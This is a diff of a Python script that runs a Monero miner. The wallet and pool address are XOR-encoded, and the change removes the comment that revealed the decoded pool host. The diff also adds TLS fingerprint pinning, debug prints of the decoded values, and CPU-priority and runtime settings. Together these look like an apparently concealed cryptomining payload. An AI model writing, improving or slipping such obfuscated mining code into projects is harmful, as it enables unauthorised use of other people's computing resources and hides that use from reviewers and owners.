@@ -12,7 +12,6 @@ ENCODED_WALLET = [
     97, 108, 0, 2, 1, 34, 59, 39, 45, 27, 13, 60, 109, 48, 24, 1, 22, 36, 49, 22, 96, 0, 102, 48, 60, 24, 29, 39, 5, 15, 62, 35, 35, 55, 38, 12, 27, 102, 2, 16, 49, 48, 97, 58, 108, 7, 12, 48, 55, 60, 45, 32, 56, 23, 22, 22, 44, 96, 58, 22, 49, 58, 6, 30, 62, 6, 103, 0, 99, 33, 108, 50, 13, 31, 19, 47, 31, 27, 62, 45, 13, 22, 98, 33, 31, 100, 0, 36, 97, 32, 62, 44, 96, 23, 5
 ]
 
-# New encoded pool: "pool.supportxmr.com:443"
 ENCODED_POOL = [
     61, 58, 58, 57, 123, 38, 32, 61, 61, 58, 35, 33, 45, 56, 35, 123, 54, 58, 56, 111, 97, 97, 102
 ]
@@ -25,7 +24,14 @@ XOR_KEY = int(os.environ.get('XOR_KEY', '0x55'), 16)
 WALLET = decode(ENCODED_WALLET, XOR_KEY)
 POOL = decode(ENCODED_POOL, XOR_KEY)
 
-# ========== Rest of script (unchanged) ==========
+# SupportXMR TLS fingerprint (from earlier successful connections)
+TLS_FINGERPRINT = "4633ddff863414b7d28bc4ce3e2966335c082d6e3783c412cc059af107a04dfd"
+
+# Debug print to verify decoded values (will appear in logs)
+print(f"Decoded wallet: {WALLET[:10]}...")  # show first 10 chars only
+print(f"Decoded pool: {POOL}")
+
+# ========== Rest of script ==========
 RUNTIME_MINUTES = 180
 MIN_WORK = 1
 MAX_WORK = 8
@@ -114,6 +120,8 @@ def main():
             f"--url={POOL}",
             f"--user={WALLET}",
             "--pass=x",
+            "--tls",
+            f"--tls-fingerprint={TLS_FINGERPRINT}",
             "--keepalive",
             f"--cpu-max-threads-hint={cpu_hint}",
             "--cpu-priority=5",
